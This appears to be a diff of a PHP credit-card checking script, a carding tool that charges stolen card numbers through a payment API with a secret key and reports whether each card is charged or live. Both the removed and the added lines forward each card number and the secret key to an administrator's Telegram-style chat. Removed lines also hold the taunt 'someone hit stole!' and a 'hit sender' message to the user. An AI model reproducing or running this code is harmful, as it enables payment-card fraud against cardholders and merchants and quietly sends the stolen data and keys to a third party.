@@ -152,13 +152,8 @@ break;
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' 𝔠𝔥𝔞𝔯𝔤𝔢𝔡 𝔟𝔶 @balenottere<br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
-    send_message($admin, "someone hit stole!<3 \nnumber ➔ <code>$lista</code>\nTYPE➠ ccn $amt € \nsecret key ➠ <code>$sk</code>");
-        send_message($userid, "𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ♻️️
-
-𝗖𝗖: <code>$lista</code>
-𝗥𝗘𝗦𝗨𝗟𝗧: <b>CCN Charged $amt$ 🔥</b>
-𝗥𝗘𝗖𝗘𝗜𝗣𝗧 𝗨𝗥𝗟: <a href='$receipturl'>Here</a>");
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' 𝔠𝔥𝔞𝔯𝔤𝔢𝔡 𝔟𝔶 @balenottere <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+    send_message($admin, "CC \nϲϲ ➔ <code>$lista</code>\nTYPE➠ Ccn $amt€ \nSK ➠ <code>$sk</code>");
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 𝗰𝘃𝘃 𝗹𝗶𝘃𝗲</span><br>';
